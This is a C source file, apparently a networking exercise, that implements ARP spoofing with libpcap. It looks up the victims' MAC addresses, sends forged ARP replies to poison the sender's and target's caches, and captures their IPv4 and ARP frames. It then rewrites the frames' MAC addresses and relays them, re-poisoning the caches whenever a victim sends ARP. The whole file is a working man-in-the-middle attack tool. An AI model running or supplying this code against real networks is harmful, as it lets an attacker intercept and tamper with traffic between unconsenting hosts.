#include "arp_lib.h"


/////////////////////////////////////
/////////////////////////////////////

struct __attribute__((packed)) rs_packet
{
	struct ether_header eth_header;
	struct arphdr arp;
	struct __attribute__((packed)) arp_data
	{
		uint8_t sha[6];
		uint32_t sip;
		uint8_t dha[6];
		uint32_t dip;
	}data;
};

//////////////////////////////////////


//////////////////////////////////////

char* MACtos(uint8_t MAC[6])
{
	char* string;

	string = (char*)malloc(20);
	sprintf(string,"%02x-%02x-%02x-%02x-%02x-%02x",MAC[0],MAC[1],MAC[2],MAC[3],MAC[4],MAC[5]);
	return string;
}
	



struct packet_list* CREATE_packet(u_char* pointer, uint32_t size)
{
	struct packet_list *tmp;
	tmp = (struct packet_list*)malloc(sizeof(struct packet_list));
	tmp->data = (u_char*)malloc(size);
	memcpy(tmp->data, pointer, size);
	tmp->size = size;
	tmp->next = NULL;
	return tmp;
}

struct packet_list* POP_packet(struct distribute_packet* list, int id)
{
	struct packet_list *tmp;
	tmp = list->packet[id];
	if(tmp == NULL)
	{
		return NULL;
	}
	list->packet[id] = tmp->next;
	return tmp;
}
void destroy_packet(struct packet_list* ppacket)
{
	free(ppacket->data);
	free(ppacket);
}

void APPEND_packet(struct distribute_packet* list, int id, struct packet_list* next)
{
	struct packet_list *tmp;
	tmp = list->packet[id];
	if(tmp == NULL)
	{
		list->packet[id] = next;
		return;
	}

	while(tmp->next != NULL)
	{
		tmp = tmp->next;
	}
	tmp->next = next;
}



void get_addr(uint8_t MAC_addr[6],struct in_addr* IP_addr,char* interface)
{
	int s,i;
	struct ifreq ifr;
	
	s = socket(AF_INET,SOCK_DGRAM,0);
	strcpy(ifr.ifr_name, interface);
	ioctl(s,SIOCGIFHWADDR, &ifr);
	for(i=0; i<6;i++)
	{
		MAC_addr[i] = ((uint8_t*)ifr.ifr_hwaddr.sa_data)[i];
	}

	ioctl(s,SIOCGIFADDR, &ifr);
	IP_addr->s_addr = *(uint32_t*)(ifr.ifr_addr.sa_data+2);

}

void rs_ARP(pcap_t* handle, uint8_t MAC_addr[6],uint8_t dest_MAC[6] ,struct in_addr* IP1, struct in_addr* IP2, int mode)
{
	struct rs_packet p;
	const u_char *stream;
	stream = (const u_char*)&p;
	memcpy(p.eth_header.ether_dhost,dest_MAC,6);
	memcpy(p.eth_header.ether_shost,MAC_addr,6);
	p.eth_header.ether_type = htons(0x0806);

	p.arp.ar_hrd = htons(1);
	p.arp.ar_pro = htons(0x0800);
	p.arp.ar_hln = (uint8_t)6;
	p.arp.ar_pln = (uint8_t)4;
	p.arp.ar_op = htons((uint16_t)mode);


	memcpy(p.data.sha,MAC_addr,6);
	p.data.sip = IP1->s_addr;
	memset(p.data.dha,0xff,6);
	p.data.dip = IP2->s_addr;


	pcap_sendpacket(handle,stream,sizeof(struct rs_packet));
}
	
void get_senders_mac(pcap_t *handle, struct in_addr* sender_IP, uint8_t MAC_addr[6])
{
	struct pcap_pkthdr *header;
	const u_char *p_data;
	struct rs_packet *p;


	while(1)
	{
		pcap_next_ex(handle, &header, &p_data);
		p = (struct rs_packet*)p_data;
		if(ntohs((p->eth_header).ether_type) == 0x0806)
		{
			if((p->data).sip == sender_IP->s_addr)
			{
				printf("[*] detected sender's ARP!\n");
				memcpy(MAC_addr,(p->data).sha,6);
				break;
			}
		}
	}
}

void distribute_packet(void* a)
{
	const u_char* p_data;
	struct pcap_pkthdr *header;
	struct ether_header* eth_header;
	struct ip* ip_header;
	struct rs_packet* arp_header;
	struct in_addr source_ip;
	struct in_addr dest_ip;
	pcap_t *handle;
	int i;
	struct in_addr tmp;
	handle = (pcap_t*)a;
	
	//p_list = (struct distribute_packet*)malloc(sizeof(struct distribute_packet));
	p_list.packet = (struct packet_list**)malloc(sizeof(struct packet_list*)*spoof_num);
	printf("[*]start packet distributing!\n");
	while(1)
	{
		pcap_next_ex(handle, &header, &p_data);
		eth_header = (struct ether_header*)p_data;
		
		if(ntohs(eth_header->ether_type) == 0x0800) // if ipv4
		{
			ip_header = (struct ip*)(p_data + 14);
			for(i=0;i < spoof_num ; i++)
			{
				if(sender_list[i].s_addr == (ip_header->ip_src).s_addr || sender_list[i].s_addr == (ip_header->ip_dst).s_addr)
				{
					//printf("%s\n",inet_ntoa(ip_header->ip_src));
					//printf("%s\n",inet_ntoa(ip_header->ip_dst));
					APPEND_packet(&p_list,i,CREATE_packet((u_char*)p_data,header->len));
					break;
				}
			}
		}

		else if(ntohs(eth_header->ether_type) == 0x0806) // if ARP
		{
			arp_header = (struct rs_packet*)(p_data+14);
			for(i=0;i<spoof_num;i++)
			{
				//printf("%s\n",MACtos((arp_header->data).sha));
				if(!memcmp(sender_MAC[i],(arp_header->data).sha,6) || !memcmp(target_MAC[i],(arp_header->data).sha,6))
				{
					APPEND_packet(&p_list,i,CREATE_packet((u_char *)p_data,header->len));
					break;
				}
			}
		}
		

	}
}


int mod_packet(u_char* mod_pointer, uint8_t my_MAC[6], uint8_t senders_MAC[6], uint8_t target_MAC[6])
{
	struct ether_header *eth_header;
	
	eth_header = (struct ether_header*)mod_pointer;
	if(ntohs(eth_header -> ether_type) == 0x0806 )
	{
		//printf("ARP detected!\n");
		if(!memcmp(eth_header->ether_shost,target_MAC,6))
		{
			return 3;
		}
		else if(!memcmp(eth_header->ether_shost, senders_MAC,6))
		{
			return 2;
		}

	}
	if(!memcmp(eth_header->ether_shost,target_MAC,6))
	{
		memcpy(eth_header->ether_dhost,senders_MAC,6);
		memcpy(eth_header->ether_shost,my_MAC,6);
	}
	else if(!memcmp(eth_header->ether_shost,senders_MAC,6))
	{
		memcpy(eth_header->ether_dhost,target_MAC,6);
		memcpy(eth_header->ether_shost, my_MAC,6);
	}
	else
	{
		return 0;
	}
	return 1;
}


void spoofing(void* t)// uint8_t target_MAC[6], uint8_t senders_MAC[6], uint8_t my_MAC[6])
{
	const u_char *p_data;
	struct pcap_pkthdr *header;
	u_char *mod_pointer;
	uint8_t broadcast_MAC[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
	int mod_status;
	struct packet_list* packet;
	pcap_t* handle;
	targ* p;
	int id;
	p = (targ*)t;
	handle = (pcap_t*)p->h;
	id = (int)p->num;
	int i;
	
	printf("[*]start %dst spoofing!\n");
	while(1)
	{
		//rs_ARP(handle, my_MAC, sender_MAC[id], &target_list[id],&sender_list[id],2); 
		//rs_ARP(handle, my_MAC, target_MAC[id], &target_list[id],&sender_list[id],2); 
		if(p_list.packet[id] == NULL)
		{
			continue;
		}
		packet = POP_packet(&p_list, id);
		if(packet == NULL)
		{
			continue;
		}
		mod_pointer = packet->data;
		
		mod_status = mod_packet(mod_pointer, my_MAC, sender_MAC[id], target_MAC[id]);
		
		if(mod_status == 2)//if sender request
		{
			
			rs_ARP(handle, my_MAC, sender_MAC[id], &target_list[id],&sender_list[id],2); //send ARP again
		}
		else if(mod_status == 3)
		{
			rs_ARP(handle,my_MAC, target_MAC[id],&sender_list[id],&target_list[id],2);
		}
		else if(mod_status)
		{
			pcap_sendpacket(handle,(const u_char*)mod_pointer, packet->size);
		}
		destroy_packet(packet);
	}	
}

